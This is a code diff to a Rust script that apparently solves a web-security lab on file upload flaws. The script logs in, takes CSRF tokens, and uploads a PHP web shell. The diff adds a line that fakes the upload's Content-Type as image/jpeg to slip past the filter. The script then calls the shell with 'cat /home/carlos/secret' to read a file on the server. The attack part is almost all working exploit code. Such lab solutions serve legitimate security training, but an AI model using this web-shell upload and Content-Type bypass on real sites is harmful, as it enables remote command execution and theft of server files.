@@ -1,6 +1,6 @@
 use file_upload_vulnerabilities::{
-    HTTP_CLIENT as client, LOGIN_CSRF_TOKEN_SELECTOR, MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR,
-    PASSWORD, USERNAME, WEBSHELL, generate_clap_parser, get_csrf_token, get_flag,
+    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR, PASSWORD,
+    USERNAME, WEBSHELL, generate_clap_parser, get_csrf_token, get_flag,
 };
 use reqwest::blocking::{
     Response,
@@ -14,17 +14,17 @@ fn main() {
     let args = generate_clap_parser();
     let lab_url = args.lab_url.as_str().trim_end_matches("/");
 
-    // Making a GET request to the given url
-    let response: Response = client
+    // Making a get request to the given URL
+    let response: Response = HTTP_CLIENT
         .get(format!("{}/login", lab_url))
         .send()
-        .expect("[-] Failed to make the GET request");
+        .expect("[-] Failed to make GET request");
 
     // Extracting the body from the response
     let body: String = response.text().expect("[-] Failed to read response text");
 
-    // Getting the CSRF token for the /login page
-    let login_page_csrf_token: String = get_csrf_token(&body, &LOGIN_CSRF_TOKEN_SELECTOR);
+    // Getting the CSRF token for /login page
+    let login_page_csrf_token = get_csrf_token(&body, &LOGIN_CSRF_TOKEN_SELECTOR);
     println!("[+] Login CSRF Token: {}", login_page_csrf_token);
 
     // Generating the login form data
@@ -35,18 +35,18 @@ fn main() {
     ];
 
     // Logging in as the given user. This request responds with the /my-account?id=wiener page
-    let response: Response = client
+    let response = HTTP_CLIENT
         .post(format!("{}/login", lab_url))
         .form(&data)
         .send()
         .expect("[-] Failed to login as the given user");
 
     // Extracting the body from the response
-    let body: String = response.text().expect("[-] Failed to read response text");
+    let body = response.text().expect("[-] Failed to read response text");
 
     // Getting the CSRF token from the /my-account?id=wiener page for the uploading avatar
-    let my_avatar_upload_csrf_token: String =
-        get_csrf_token(&body, &MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR);
+    let my_avatar_upload_csrf_token = get_csrf_token(&body, &MY_AVATAR_UPLOAD_CSRF_TOKEN_SELECTOR);
+
     println!(
         "[+] My Avatar Upload CSRF Token: {}",
         &my_avatar_upload_csrf_token
@@ -55,7 +55,8 @@ fn main() {
     // Generating the web shell payload to upload
     let payload: Part = Part::bytes(WEBSHELL.as_bytes())
         .file_name("web-shell.php")
-        .mime_str("application/x-php")
+        // Bypassing Content-Type restriction
+        .mime_str("image/jpeg")
         .expect("[-] Failed to generate payload");
 
     // Generating avatar upload multipart form data
@@ -65,16 +66,16 @@ fn main() {
         .part("avatar", payload);
 
     // Uploading the Payload
-    let response: Response = client
+    let response = HTTP_CLIENT
         .post(format!("{}/my-account/avatar", lab_url))
         .multipart(form)
         .send()
-        .expect("[-] Failed to upload the payload");
+        .expect("[-] Failed to upload payload");
 
     // If payload upload successful
     if response.status() == 200 {
         // Trying to read the secret
-        let response: Response = client
+        let response: Response = HTTP_CLIENT
             .get(format!(
                 "{}/files/avatars/web-shell.php?command=cat /home/carlos/secret",
                 lab_url
